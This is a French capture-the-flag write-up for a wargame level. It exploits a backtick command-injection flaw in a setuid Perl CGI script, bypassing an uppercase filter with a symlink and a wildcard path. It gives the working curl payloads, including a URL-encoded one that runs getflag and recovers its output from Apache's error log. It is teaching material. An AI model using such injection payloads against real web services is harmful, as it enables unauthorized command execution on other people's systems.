# Level12

Premiere étape de recherche

	$ ls -la
	-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl

On trouve un script perl avec setuid/setgid

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";


sub t {
  $nn = $_[1];
  $xx = $_[0];
  # Transforme le lowercase en uppercase
  $xx =~ tr/a-z/A-Z/;
  # Supprime tout ce qui suis un espace?
  $xx =~ s/\s.*//;
  # ICI il y a une faille c'est le subshell avec ``, ça execute le parametre, mais il y a une substitution dessus avant
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

# Si il y a 1 parametre print '..' sinon '.'
sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}
# Prend 2 parametres x et y
n(t(param("x"), param("y")));
```

Un script CGI donc servi par un serveur web

On peut le verifier avec un curl depuis notre machine

	$ curl -I 192.168.1.27:4646
	HTTP/1.1 200 OK
	Date: Fri, 29 Nov 2019 00:00:51 GMT
	Server: Apache/2.2.22 (Ubuntu)
	Vary: Accept-Encoding
	Content-Length: 2
	Content-Type: text/html

La faille est le subshell avec ``, ça execute le parametre, mais il y a une substitution dessus avant

``` perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

Il donc faut passer en parametre "x" une commande a executer, MAIS ce sera transformé en majuscule

Peut on passer par une variable d'env?

	$ export CMD="getflag > /tmp/coucou && chmod 777 /tmp/coucou"
	$ curl '192.168.1.27:4646?x=`$CMD`'

Ça ne fonction pas parce que l'environnement est propre a level12 et flag12 ni aura pas acces

Si un fichier à un nom unique, on peut le trouver ou l'executer dans le shell bash avec un wildcard

exemple : `/*/ls` trouve `/bin/ls`

On va creer un lien vers getflag en majuscule

	$ ln -s /bin/getflag /tmp/GETFLAG

	$ /*/GETFLAG
	Check flag.Here is your token :
	Nope there is no token here for you sorry. Try again :)


Cela execute bien getflag via le lien

On a aussi besoin d'un fichier pour récupérer la sortie de getflag

	$ echo coucou > /tmp/COUCOU
	$ cat /*/COUCOU
	coucou

Ok donc il faut rediriger getflag vers ce fichier dans la commande injectée

	$ curl '192.168.1.27:4646?x=;/*/GETFLAG > /*/COUCOU;'

Ne fonctionne pas

	$ curl '192.168.1.27:4646?x=$(/*/GETFLAG>/*/COUCOU)'

Non plus

Pourquoi? On a acces aux logs Apache, regardons

	$ tail /var/log/apache2/error.log
	[Fri Nov 29 17:23:44 2019] [error] [client 192.168.1.22]
	[Fri Nov 29 17:23:59 2019] [error] [client 192.168.1.22] sh: 1:
	[Fri Nov 29 17:23:59 2019] [error] [client 192.168.1.22] cannot create /*/COUCOU: Directory nonexistent
	[Fri Nov 29 17:23:59 2019] [error] [client 192.168.1.22]

On a fait une erreur. La substitution enleve bien tout ce qui suis un espace, donc il ne faut pas en mettre

On va plutot essayer de récupérer dans les logs d'erreur d'apache en redirigeant sur la sortie d'erreur plutot que dans le fichier, ce sera plus simple étant donné qu'on y a acces

	$ curl '192.168.1.27:4646?x=`/*/GETFLAG>&2`'

Ca ne fonctionne pas, il prend & comme un second argument parce que c'est une url... Il faut l'encoder avec la convention des urls

Encoder l'url https://www.urlencoder.org/

	$ curl '192.168.1.27:4646?x=`%2F%2A%2FGETFLAG%3E%262`'

	$ tail /var/log/apache2/error.log
	[Fri Nov 29 18:18:59 2019] [error] [client 192.168.1.22] Check flag.Here is your token : XXXXXXXXXXXXXXXXXxxx
